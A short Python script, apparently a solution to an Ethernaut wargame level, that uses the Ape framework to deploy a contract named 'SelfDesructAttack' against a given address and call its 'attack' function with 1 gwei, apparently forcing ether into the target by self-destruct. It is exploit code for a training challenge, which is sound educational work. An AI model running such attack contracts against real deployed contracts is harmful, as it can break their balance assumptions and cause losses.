from ape import project, accounts, convert


def deploy():
    account = accounts.load("ethernaut")
    contract = account.deploy(
        project.SelfDesructAttack,
        "0x51220Fa19121878D3C01B3973CE36219504dDd20",
        max_priority_fee="0.5 gwei",
        max_fee="1 gwei",
        sender=account,
        publish=True,
    )
    return contract


def sent_tx():
    account = accounts.load("ethernaut")
    contract = project.SelfDesructAttack.at(
        "0x1E8fB59E7737EF841d212fd4aAfb8D77938316fb"
    )
    contract.invoke_transaction(
        "attack",
        value=convert("1 gwei", int),
        max_priority_fee="0.5 gwei",
        max_fee="1 gwei",
        sender=account,
    )


def main():
    sent_tx()
